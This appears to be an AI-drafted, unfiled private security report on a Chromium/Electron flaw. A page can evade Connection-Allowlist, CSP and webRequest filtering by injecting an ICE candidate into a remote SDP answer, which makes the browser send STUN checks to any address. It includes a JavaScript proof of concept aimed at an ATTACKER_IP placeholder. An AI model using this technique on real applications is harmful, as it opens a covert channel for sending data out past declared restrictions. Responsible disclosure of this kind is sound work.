# Upstream report draft — Chromium: `Connection-Allowlist` does not stop remote-ICE-candidate connectivity checks on custom-scheme documents

Status: draft, not for public posting — to be filed privately (Chromium security tracker) if the owner approves, with Electron told privately. This file is a draft; nothing here has been posted.

## Summary

Chromium 156 (shipped unchanged by Electron 45.2.3) enforces the `Connection-Allowlist` response header on a privileged custom scheme's documents. When a document carries `Connection-Allowlist`, Blink drops every ICE server from the WebRTC configuration and skips `addIceCandidate`, and the network service refuses to resolve unlisted hosts. That works for STUN, TURN and DNS prefetch.

It does **not** stop ICE connectivity checks the page starts through a remote description. A page can construct an `RTCPeerConnection` with no ICE servers, write an arbitrary `a=candidate` line into a remote answer's SDP, and `setRemoteDescription` it. Chromium's native WebRTC layer then sends STUN binding requests (connectivity checks) to whatever address the page wrote, from the frame's P2P sockets, carrying a username fragment the page also wrote. This is a one-way channel a page can aim at any address it did not declare, with the full `Connection-Allowlist`, CSP and `webRequest` stack enabled. It reproduces on macOS, Windows and Ubuntu.

The same mechanism has a second, fail-closed symptom: in frames whose host was set up under a restricted parent, the renderer's first request for the mDNS interface (`network.mojom.MdnsResponder`) is a bad Mojo message and Chromium kills the whole render process. Upstream commit `46fcf3faed` ("Enforce WebRTC blocking in binders via no-op impls") replaces those kills with no-op interfaces, but whether that also covers a directly mounted document is not known from this work and was not tested against that commit.

## Expected vs actual

- **Expected:** with `Connection-Allowlist` set, a document reaches only the response-origin it declares. WebRTC sockets bound for that document should not send anything to an unlisted address.
- **Actual:** a directly mounted document on the custom scheme, and a sandboxed srcdoc inside it, send 10–15 STUN checks per run to an address the page named only in a remote description, on all three OSes. The browser binds P2P sockets for those documents instead of giving them no-op interfaces.

A "directly mounted document" here means a subframe on a custom scheme whose own response carries the header and whose parent response does not. An `https` top-level document was not tested.

## Versions

- Chromium 156.0.8078.80, as shipped in Electron 45.2.3 (Node 24.22.2).
- Reproduced on macOS 15 arm64, Windows Server 2025 x64, and Ubuntu 24.04 x64 (under xvfb).
- Upstream Chromium reference: `46fcf3faed` (2026-10-08), not present in 156.0.8078.80.

<details>
<summary>Minimal reproduction</summary>

The snippet is adapted from the S9 harness and was not run as written; it should be run once when filing. Register a privileged custom scheme, serve one document over it with `Connection-Allowlist: ("https://allowed.example/*" response-origin)` and a CSP listing only that origin. From the page, run:

```js
const pc = new RTCPeerConnection(); // no iceServers
pc.createDataChannel("x");
const offer = await pc.createOffer();
await pc.setLocalDescription(offer);
const sdp = offer.sdp.replace(/a=setup:actpass/g, "a=setup:active")
  + `a=candidate:1 1 udp 2122260223 ${ATTACKER_IP} ${ATTACKER_PORT} typ host\r\n`;
await pc.setRemoteDescription({ type: "answer", sdp });
```

`ATTACKER_IP:ATTACKER_PORT` is any reachable UDP listener. That listener receives STUN binding requests (magic cookie `0x2112a442`) whose username fragment is whatever the page wrote into the descriptor — despite `Connection-Allowlist`, the CSP, and a `webRequest` filter that cancels every request whose `initiatorOrigin` is not the declared origin. The same probe from a document whose frame stayed in a restricted parent's process instead kills the renderer with `No binder found for interface network.mojom.MdnsResponder`.

The checks are attributed to the page, not an ICE server: with no `iceServers` configured, gathering produces only host candidates and no STUN/TURN round-trip leaves the process, so the only packets to `ATTACKER_IP` are the connectivity checks themselves.

</details>

This report was written by an AI agent on the reporter's behalf.